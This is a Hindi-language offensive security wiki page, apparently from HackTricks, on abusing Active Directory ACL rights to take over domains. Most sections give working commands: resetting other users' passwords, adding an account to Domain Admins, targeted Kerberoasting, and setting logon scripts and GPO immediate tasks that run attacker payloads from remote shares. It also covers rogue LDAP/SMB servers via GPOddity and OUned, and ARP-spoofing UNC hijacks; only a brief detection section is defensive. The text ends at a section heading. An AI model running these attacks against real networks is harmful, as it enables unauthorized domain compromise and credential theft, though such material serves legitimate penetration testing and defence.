# Active Directory ACLs/ACEs का दुरुपयोग

{{#include ../../../banners/hacktricks-training.md}}

**यह पेज मुख्य रूप से इन तकनीकों का सारांश है:** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **और** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)** से लिया गया है। अधिक जानकारी के लिए, मूल लेख देखें।**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

डिलीट किए गए object के ACL के दुरुपयोग और account को फिर से सक्रिय करने के लिए, [AD Recycle Bin reanimation](../privileged-groups-and-token-privileges.md#reanimating-a-deleted-account-through-delegated-acls) देखें।

## **User पर GenericAll अधिकार**

यह privilege किसी attacker को target user account पर पूरा नियंत्रण देता है। `Get-ObjectAcl` command का उपयोग करके `GenericAll` अधिकारों की पुष्टि होने के बाद, attacker ये कर सकता है:

- **Target का Password बदलना**: `net user <username> <password> /domain` का उपयोग करके, attacker user का password reset कर सकता है।
- Linux से, Samba `net rpc` के साथ SAMR पर भी यही किया जा सकता है:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **यदि account disabled है, तो UAC flag हटाएँ**: `GenericAll` से `userAccountControl` को संपादित किया जा सकता है। Linux से, BloodyAD `ACCOUNTDISABLE` flag हटा सकता है:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: यूज़र के अकाउंट को kerberoastable बनाने के लिए उसमें SPN असाइन करें, फिर ticket-granting ticket (TGT) hashes निकालने और उन्हें crack करने का प्रयास करने के लिए Rubeus और targetedKerberoast.py का उपयोग करें।

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: user के लिए pre-authentication disable करें, जिससे उनका account ASREPRoasting के प्रति vulnerable हो जाता है।

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: किसी user पर `GenericAll` होने पर, आप certificate-based credential जोड़कर उसका password बदले बिना उसके रूप में authenticate कर सकते हैं। देखें:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Group पर GenericAll अधिकार**

यह privilege किसी attacker को group memberships में बदलाव करने की अनुमति देता है, यदि उसके पास `Domain Admins` जैसे group पर `GenericAll` अधिकार हों। `Get-NetGroup` से group का distinguished name पता लगाने के बाद, attacker यह कर सकता है:

- **खुद को Domain Admins Group में जोड़ें**: यह सीधे commands के ज़रिए या Active Directory या PowerSploit जैसे modules का उपयोग करके किया जा सकता है।

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Linux से आप उन arbitrary groups में खुद को जोड़ने के लिए BloodyAD का भी इस्तेमाल कर सकते हैं, जिनकी membership पर आपका GenericAll/Write अधिकार है। यदि target group “Remote Management Users” में nested है, तो उस group को मान्यता देने वाले hosts पर आपको तुरंत WinRM access मिल जाएगा:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **कंप्यूटर/यूज़र पर GenericAll / GenericWrite / Write**

कंप्यूटर ऑब्जेक्ट या यूज़र अकाउंट पर ये विशेषाधिकार होने से आप:

- **Kerberos Resource-based Constrained Delegation**: कंप्यूटर ऑब्जेक्ट को अपने नियंत्रण में ले सकते हैं।
- **Shadow Credentials**: Shadow Credentials बनाने के विशेषाधिकारों का फायदा उठाकर कंप्यूटर या यूज़र अकाउंट का रूप धारण कर सकते हैं।

## किसी ऑब्जेक्ट को inherited OU permissions वाले OU में ले जाना

एक path में **किसी अकाउंट को move करने के अधिकार** और **destination OU से inherited write अधिकार** शामिल हो सकते हैं, भले ही शुरुआत में कोई भी principal अकाउंट के संवेदनशील attributes को संशोधित न कर सके। Source object की move permissions और destination पर `CreateChild` की जाँच करें, ऑब्जेक्ट को move करें, फिर उसकी effective DACL की दोबारा जाँच करें। उदाहरण के लिए, powerview.py का `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'` यूज़र को move करता है; उस OU पर inherited `GenericWrite` वाला नियंत्रित group फिर [shadow credential](shadow-credentials.md) जोड़ सकता है। केवल move करने से inherited right नहीं बनता।<sup>[[18]](#references)</sup>

अगर आपके पास किसी OU पर `GenericAll` है, लेकिन कोई उपयुक्त inherited ACE नहीं है, तो `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>` उसके descendants के लिए एक ACE जोड़ सकता है। Target account को अलग से जाँचें: **AdminSDHolder-संरक्षित अकाउंट्स में inheritance disabled होता है**, इसलिए OU ACE सामान्य यूज़र्स पर असर डाल सकता है, लेकिन किसी संरक्षित यूज़र पर नहीं। देखें [AdminSDHolder and SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group)।<sup>[[18]](#references)</sup>

दुरुपयोग का एक अलग path तब मौजूद होता है जब कोई privileged scheduled cleanup script, attacker के प्रभाव में आने वाले ACEs के आधार पर OUs चुनती है, और फिर उनके descendants पर `Set-ADObject -Clear adminCount` **और** `$acl.SetAccessRuleProtection($False, $False)` चलाती है। अगर आप OU DACL संशोधित कर सकते हैं, तो script द्वारा जाँचे जाने वाले group को आवश्यक `ExtendedRight` या `GenericAll` ACE दें; अलग से यह भी जाँचें कि आप task चला सकते हैं। इसके बाद privileged task पहले से संरक्षित अकाउंट पर inheritance बहाल कर सकता है, जिससे OU ACE लागू हो सके। सटीक script, trigger permission और परिणामी DACL की पुष्टि करें; केवल `adminCount` साफ़ करने से inheritance फिर से सक्षम नहीं होता, और protected groups में बने रहने वाले अकाउंट्स को SDProp फिर से संरक्षित कर सकता है।<sup>[[18]](#references)</sup>

## **Group पर WriteProperty**

अगर किसी यूज़र के पास किसी विशिष्ट group (जैसे, `Domain Admins`) के सभी objects पर `WriteProperty` अधिकार हैं, तो वह:

- **खुद को Domain Admins Group में जोड़ सकता है**: `net user` और `Add-NetGroupUser` commands को मिलाकर यह तरीका domain में privilege escalation की अनुमति देता है।

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Group पर Self (Self-Membership)**

यह privilege attackers को ऐसे commands के ज़रिए खुद को `Domain Admins` जैसे विशेष groups में जोड़ने की अनुमति देता है, जो सीधे group membership में बदलाव करते हैं। निम्नलिखित command sequence से खुद को group में जोड़ा जा सकता है:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

यह एक समान privilege है, जो attackers को groups पर सीधे खुद को जोड़ने की अनुमति देता है, यदि उन्हें उन groups पर `WriteProperty` right प्राप्त हो। इस privilege की पुष्टि और इसका उपयोग इन तरीकों से किया जाता है:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

किसी user पर `User-Force-Change-Password` के लिए `ExtendedRight` होने से, मौजूदा password जाने बिना उसे reset किया जा सकता है। इस अधिकार की पुष्टि और इसका exploitation PowerShell या अन्य command-line tools से किया जा सकता है। इनमें user का password reset करने के कई तरीके शामिल हैं, जैसे interactive sessions और non-interactive environments के लिए one-liners। ये commands आसान PowerShell invocations से लेकर Linux पर `rpcclient` के इस्तेमाल तक हैं और attack vectors की विविधता दिखाते हैं।

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner on Group**

यदि किसी attacker को पता चलता है कि उसके पास किसी group पर `WriteOwner` अधिकार हैं, तो वह उस group का ownership बदलकर अपने नाम कर सकता है। यह विशेष रूप से तब प्रभावशाली होता है जब संबंधित group `Domain Admins` हो, क्योंकि ownership बदलने से group के attributes और membership पर व्यापक नियंत्रण मिलता है। इस प्रक्रिया में `Get-ObjectAcl` का उपयोग करके सही object की पहचान की जाती है और फिर `Set-DomainObjectOwner` का उपयोग करके owner को SID या नाम से बदला जाता है।

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **User पर GenericWrite**

यह permission attacker को user properties modify करने की अनुमति देती है। विशेष रूप से, `GenericWrite` access के साथ attacker किसी user का logon script path बदलकर user के logon करने पर malicious script execute कर सकता है। इसके लिए `Set-ADObject` command का उपयोग करके target user की `scriptpath` property को attacker की script पर point करने के लिए update किया जाता है।

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

एक अधिक सीमित `WriteProperty` ACE, जो उपयोगकर्ता के [`scriptPath` attribute](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) तक सीमित हो, पर्याप्त हो सकता है; `GenericWrite` आवश्यक नहीं है। उस attribute अधिकार को डोमेन के `SYSVOL\<domain>\scripts` या `NETLOGON` tree में ऐसी writable script के साथ जोड़ें, फिर आकलन करें कि लक्षित उपयोगकर्ता के log on करके script तक पहुँचने की संभावना है या नहीं। Log on होने पर script उस उपयोगकर्ता के context में चलती है। प्रभावी AD और file/share ACLs की अलग-अलग समीक्षा करें; केवल मेल खाता Allow ACE या writable directory होना पूरी प्रक्रिया के संभव होने को साबित नहीं करता।

## **Group पर GenericWrite**

इस privilege से attackers group membership में बदलाव कर सकते हैं, जैसे स्वयं को या अन्य उपयोगकर्ताओं को विशिष्ट groups में जोड़ना। इस प्रक्रिया में credential object बनाना, उसका उपयोग करके उपयोगकर्ताओं को किसी group में जोड़ना या उससे हटाना, और PowerShell commands से membership में हुए बदलावों की पुष्टि करना शामिल है।

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Linux से, Samba `net` group पर `GenericWrite` होने पर सदस्यों को जोड़ या हटा सकता है (जब PowerShell/RSAT उपलब्ध न हों, तब उपयोगी):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

AD object का स्वामी होना और उस पर `WriteDACL` विशेषाधिकार होना, हमलावर को object पर `GenericAll` विशेषाधिकार देने में सक्षम बनाता है। यह ADSI manipulation के ज़रिए किया जाता है, जिससे object पर पूरा नियंत्रण मिलता है और उसकी group memberships में बदलाव किया जा सकता है। इसके बावजूद, Active Directory module के `Set-Acl` / `Get-Acl` cmdlets का इस्तेमाल करके इन विशेषाधिकारों का फायदा उठाने की कोशिश करने पर कुछ सीमाएँ होती हैं।<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### WriteDACL/WriteOwner से त्वरित takeover (PowerView)

जब किसी user या service account पर आपके पास `WriteOwner` और `WriteDacl` हो, तो पुराने password को जाने बिना PowerView का उपयोग करके आप उसका पूरा नियंत्रण ले सकते हैं और उसका password reset कर सकते हैं:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Notes:
- यदि आपके पास केवल `WriteOwner` है, तो आपको पहले owner को स्वयं में बदलना पड़ सकता है:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Password reset के बाद किसी भी protocol (SMB/LDAP/RDP/WinRM) से access validate करें।

## **Domain पर Replication (DCSync)**

DCSync attack, Domain Controller का रूप धारण करके डेटा synchronize करने के लिए domain पर विशिष्ट replication permissions का लाभ उठाता है। इसमें user credentials भी शामिल हैं। इस शक्तिशाली technique के लिए `DS-Replication-Get-Changes` जैसी permissions आवश्यक हैं, जो attackers को Domain Controller तक सीधी पहुंच के बिना AD environment से संवेदनशील जानकारी निकालने देती हैं।<sup>[[5]](#references)</sup> [**DCSync attack के बारे में यहां और जानें।**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Group Policy Objects (GPOs) को manage करने के लिए delegated access गंभीर security risks पैदा कर सकता है। उदाहरण के लिए, यदि `offense\spotless` जैसे user को GPO management rights delegate किए गए हैं, तो उनके पास **WriteProperty**, **WriteDacl**, और **WriteOwner** जैसी privileges हो सकती हैं। इन permissions का malicious उद्देश्यों के लिए दुरुपयोग किया जा सकता है, जैसा कि PowerView से पहचाना गया है: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### GPO Permissions की Enumeration

गलत तरीके से configure किए गए GPOs की पहचान करने के लिए, PowerSploit के cmdlets को एक साथ chain किया जा सकता है। इससे उन GPOs का पता लगाया जा सकता है जिन्हें किसी विशिष्ट user के पास manage करने की permissions हैं: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**दी गई Policy लागू होने वाले Computers**: यह पता लगाया जा सकता है कि कोई विशिष्ट GPO किन computers पर लागू होता है, जिससे संभावित प्रभाव का दायरा समझने में मदद मिलती है। `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**किसी दिए गए Computer पर लागू Policies**: किसी विशेष computer पर लागू policies देखने के लिए `Get-DomainGPO` जैसे commands का उपयोग किया जा सकता है।

**दी गई Policy लागू होने वाले OUs**: किसी दी गई policy से प्रभावित organizational units (OUs) की पहचान `Get-DomainOU` का उपयोग करके की जा सकती है।

GPOs की enumeration और उनमें समस्याएं ढूंढने के लिए [**GPOHound**](https://github.com/cogiceo/GPOHound) tool का भी उपयोग किया जा सकता है।

### GPO का दुरुपयोग - New-GPOImmediateTask

गलत तरीके से configure किए गए GPOs का code execute करने के लिए exploit किया जा सकता है, उदाहरण के लिए, immediate scheduled task बनाकर। प्रभावित machines पर user को local administrators group में जोड़ने के लिए ऐसा किया जा सकता है, जिससे privileges में काफी वृद्धि होती है:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - Abuse GPO

यदि GroupPolicy module इंस्टॉल है, तो यह नए GPO बनाने और उन्हें लिंक करने की अनुमति देता है, साथ ही प्रभावित कंप्यूटरों पर backdoors निष्पादित करने के लिए registry values जैसी preferences सेट करने की भी अनुमति देता है। इस विधि में GPO को अपडेट करना और निष्पादन के लिए किसी उपयोगकर्ता का कंप्यूटर पर लॉग इन करना आवश्यक है:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - GPO का दुरुपयोग

SharpGPOAbuse मौजूदा GPOs में tasks जोड़कर या settings संशोधित करके उनका दुरुपयोग करने का तरीका प्रदान करता है, जिसके लिए नए GPOs बनाने की आवश्यकता नहीं होती। इस tool के लिए बदलाव लागू करने से पहले मौजूदा GPOs को संशोधित करना या नए GPOs बनाने के लिए RSAT tools का उपयोग करना आवश्यक है:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### नीति अपडेट बाध्य करें

GPO अपडेट आम तौर पर हर 90 मिनट में होते हैं। इस प्रक्रिया को तेज़ करने के लिए, विशेषकर कोई बदलाव लागू करने के बाद, लक्ष्य कंप्यूटर पर `gpupdate /force` कमांड चलाकर तुरंत नीति अपडेट किया जा सकता है। इससे GPO में किए गए बदलाव अगले स्वचालित अपडेट चक्र की प्रतीक्षा किए बिना लागू हो जाते हैं।

### आंतरिक कार्यप्रणाली

किसी GPO, जैसे `Misconfigured Policy`, के Scheduled Tasks की जाँच करने पर `evilTask` जैसे टास्क जोड़े जाने की पुष्टि की जा सकती है। ये टास्क सिस्टम के व्यवहार में बदलाव करने या विशेषाधिकार बढ़ाने के उद्देश्य से स्क्रिप्ट या कमांड-लाइन टूल के ज़रिए बनाए जाते हैं।

`New-GPOImmediateTask` द्वारा बनाई गई XML कॉन्फ़िगरेशन फ़ाइल में टास्क की संरचना दिखाई गई है। इसमें शेड्यूल किए गए टास्क का विवरण होता है, जिसमें चलाया जाने वाला कमांड और उसके ट्रिगर शामिल हैं। यह फ़ाइल दिखाती है कि GPO के भीतर शेड्यूल किए गए टास्क कैसे परिभाषित और प्रबंधित होते हैं, जिससे नीति लागू करने के हिस्से के रूप में मनमाने कमांड या स्क्रिप्ट चलाए जा सकते हैं।

### उपयोगकर्ता और समूह

GPO लक्ष्य सिस्टम पर उपयोगकर्ताओं और समूहों की सदस्यता में बदलाव करने की भी अनुमति देते हैं। Users and Groups नीति फ़ाइलों को सीधे संपादित करके, हमलावर उपयोगकर्ताओं को विशेषाधिकार प्राप्त समूहों, जैसे स्थानीय `administrators` समूह, में जोड़ सकते हैं। GPO प्रबंधन अनुमतियों के प्रत्यायोजन से यह संभव होता है, क्योंकि इससे नीति फ़ाइलों में नए उपयोगकर्ता जोड़ने या समूह सदस्यता बदलने की अनुमति मिलती है।

Users and Groups की XML कॉन्फ़िगरेशन फ़ाइल बताती है कि ये बदलाव कैसे लागू किए जाते हैं। इस फ़ाइल में प्रविष्टियाँ जोड़कर, प्रभावित सिस्टम पर विशिष्ट उपयोगकर्ताओं को उच्च विशेषाधिकार दिए जा सकते हैं। यह GPO में हेरफेर करके विशेषाधिकार बढ़ाने का सीधा तरीका है।

स्थानीय समूह सदस्यता और उपयोगकर्ता अधिकारों जैसी सुरक्षा सेटिंग्स के लिए, लागू GPO टेम्पलेट `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` और `SecEdit` डायरेक्टरी ACL की भी जाँच करें। लिखने योग्य डायरेक्टरी या फ़ाइल जाँच का एक संकेत है: बदलाव प्रभावी हो सकता है या नहीं, यह तय करने के लिए SYSVOL शेयर की प्रभावी पहुँच, deny और inherited ACLs, Group Policy container की अनुमतियाँ, नीति का दायरा और क्लाइंट का रिफ़्रेश भी मायने रखते हैं। केवल “GPO Managers” नामक समूह की सदस्यता से संपादन अधिकार सिद्ध नहीं होते। [Microsoft इस टेम्पलेट पथ और Group Policy container/template के विभाजन का दस्तावेज़ देता है।](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

इसके अलावा, कोड चलाने या persistence बनाए रखने के अन्य तरीकों पर भी विचार किया जा सकता है, जैसे logon/logoff scripts का उपयोग, autoruns के लिए registry keys में बदलाव, .msi फ़ाइलों के ज़रिए सॉफ़्टवेयर इंस्टॉल करना या service configurations संपादित करना। ये तकनीकें GPO के दुरुपयोग से पहुँच बनाए रखने और लक्ष्य सिस्टम को नियंत्रित करने के विभिन्न तरीके प्रदान करती हैं।

### प्रमाणीकृत rogue सेवाओं की ओर GPC/GPT retrieval को redirect करना

एक GPO में metadata वाला LDAP **Group Policy Container (GPC)** और नीति फ़ाइलों वाला SMB-hosted **Group Policy Template (GPT)** शामिल होता है। रिफ़्रेश के दौरान, क्लाइंट कंटेनर के `gPLink` का अनुसरण करता है, संदर्भित GPC और उसका `gPCFileSysPath` पढ़ता है, फिर उस UNC path से GPT डाउनलोड करता है। इसलिए, GPC या किसी OU, Site या Domain के `gPLink` तक लिखने की पहुँच को विशेषाधिकार प्राप्त नीति प्रोसेसिंग में बदला जा सकता है।<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### GPOddity के साथ `gPCFileSysPath` poisoning

यदि नियंत्रित principal लक्ष्य GPC में लिख सकता है (सीधे या **NTLM relay to LDAP** के ज़रिए), तो `gPCFileSysPath` को हमलावर द्वारा होस्ट किए गए UNC path से बदलें। [GPOddity](https://github.com/synacktiv/GPOddity) LDAP बदलाव को स्वचालित करता है और एक malicious GPT होस्ट करता है, जिसमें module-based policy files या Immediate Task होता है, जिसे Group Policy client `NT AUTHORITY\SYSTEM` के रूप में चलाता है।<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

मौजूदा Windows क्लाइंट पर anonymous या credential-agnostic SMB share पर्याप्त नहीं है: SMB Secure Negotiate के लिए यह प्रमाण आवश्यक है कि authentication सफल हुआ था, इसलिए rogue service को domain identity validate करनी होगी, SMB session key निकालनी होगी और अपने responses पर सही ढंग से हस्ताक्षर करने होंगे। Embedded mode में, GPOddity को नियंत्रित machine account और उसकी service key के साथ कॉन्फ़िगर करें, फिर `[COMMANDS]` सेक्शन में computer-side या user-side payload चुनें।<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**User GPO का विशेष मामला:** MS16-072 के बाद भी, Windows एक ही TCP connection में दो SMB2 sessions बनाता है: user session `GPT.INI` पढ़ता है, फिर computer-account session प्रभावी configuration जैसे `ScheduledTasks.xml` पढ़ता है। इसलिए rogue server को authentication state, session keys और signing keys को केवल socket से नहीं, बल्कि SMB2 `SessionId` के आधार पर index करना चाहिए। GPOddity/OUned में embedded Scapy fork, `SMBStreamSocketMultiplexing` और multiplexing-aware `SMBServer` के ज़रिए इसे लागू करता है; single-session Impacket/Scapy servers अन्यथा गलत signing state का पुनः उपयोग करते हैं और user policies पर विफल हो जाते हैं।<sup>[[15]](#references)</sup>

#### OUned के साथ `gPLink` poisoning

OU, Site या Domain पर `WriteGPLink`, `GenericWrite` या समकक्ष नियंत्रण होने पर, attacker ऐसा link जोड़ सकता है जिसका GPC DN, attacker-controlled LDAP host से serve किया जाता है। यह तकनीक मूल रूप से Petros Koutroumpis ने प्रस्तुत की थी; [OUned](https://github.com/synacktiv/OUned) LDAP write और malicious GPC/GPT chain को automate करता है।<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

पीड़ित पहले rogue LDAP service से authenticate करता है और एक GPC प्राप्त करता है, जिसका `gPCFileSysPath` rogue SMB service की ओर इंगित करता है; फिर वह SMB से authenticate करता है और दिए गए GPT को लागू करता है। इसलिए OUned को LDAP SPN वाले एक account, SMB के लिए HOST SPN वाले एक machine account (एक ही machine account दोनों आवश्यकताएँ पूरी कर सकता है), और ऐसी DNS resolution या reverse forwarding की आवश्यकता होती है जो ports 389 और 445 को operator host पर भेजे।<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUned का embedded Scapy LDAP server वास्तविक नियंत्रित service key से Kerberos/SPNEGO को validate करता है और JSON से मनमाना GPC data serve करता है। खाली JSON key rootDSE को दर्शाती है, `base64:` prefixes binary values दर्शाते हैं, और server add/delete/modify/search के साथ `BASE`, `LEVEL` और `SUBTREE` searches को support करता है; यह no protection, integrity या confidentiality negotiate कर सकता है। इससे यह service तब फिर से उपयोग की जा सकती है, जब कोई अन्य Windows component attacker-controlled LDAP reference को follow करे, लेकिन authenticated LDAP पर ज़ोर दे।<sup>[[15]](#references)</sup>

यह न मानें कि किसी account का password dummy domain में synchronize करने से हर Kerberos key बन जाएगी: RC4 password से derive होता है, जबकि AES string-to-key में principal के hostname/domain से derive किया गया salt भी इस्तेमाल होता है। वास्तविक account AES key को `KerberosSSP` में देने से machine account के self-writable `msDS-SupportedEncryptionTypes` में detectable बदलाव करके RC4 को लागू करने की ज़रूरत नहीं पड़ती।<sup>[[15]](#references)</sup>

#### Detection pivots

`gPCFileSysPath` या `gPLink` में बदलावों का GPO version changes और नए Immediate/Scheduled Task XML के साथ correlation करें। अनपेक्षित naming contexts के links, approved DC/SYSVOL set से बाहर के UNC hosts, machine-account names को redirect करने वाले DNS records, असामान्य machine accounts के लिए LDAP/CIFS service tickets, और RC4 enable करने वाले `msDS-SupportedEncryptionTypes` changes की जाँच करें।<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

OU/domain पर `WriteGPLink` से आप target container के `gPLink` attribute में बदलाव कर सकते हैं और GPO को स्वयं edit किए बिना **मौजूदा GPO को लागू होने के लिए मजबूर कर सकते हैं**। यह तब दिलचस्प हो जाता है, जब linked GPO पहले से ही **UNC paths** (`\\HOST\share\...`) से remote content reference करता हो, क्योंकि authenticated users **SYSVOL** पढ़ सकते हैं और दोबारा इस्तेमाल की जा सकने वाली policies को offline खोज सकते हैं।<sup>[[11]](#references)</sup>

उच्च-स्तरीय workflow:

1. OU पर `WriteGPLink` वाले principal की पहचान करने और उस OU के अंदर के computers/users की enumeration करने के लिए BloodHound इस्तेमाल करें।
2. `SYSVOL` को read-only clone करें और UNC paths reference करने वाले **Software Installation**, **drive mappings** (`Drives.xml`), तथा **logon/startup scripts** खोजने के लिए GPOs parse करें।
3. DFS/domain-namespace paths के बजाय **direct hostname** को point करने वाली policies चुनें (उदाहरण के लिए `\\DC02\share\pkg.msi`), क्योंकि hostname-based paths को L2 spoofing से redirect करना आसान है।
4. चुने हुए GPO GUID को target OU के `gPLink` में जोड़ें, ताकि victim उस पहले से मौजूद policy को process करे।
5. उसी broadcast domain पर UNC host को ARP spoof करें और उसका IP locally bind करें (`ip addr add <target_ip>/32 dev <iface>`), ताकि victim का SMB traffic आपके host तक पहुँचे।
6. अपेक्षित path/filename को attacker SMB server (उदाहरण के लिए `smbserver.py`) से serve करें और सामान्य policy processing का इंतज़ार करें।

`SYSVOL` collection और GPO correlation का उदाहरण:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

मौजूदा GPO को target OU से लिंक करें:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

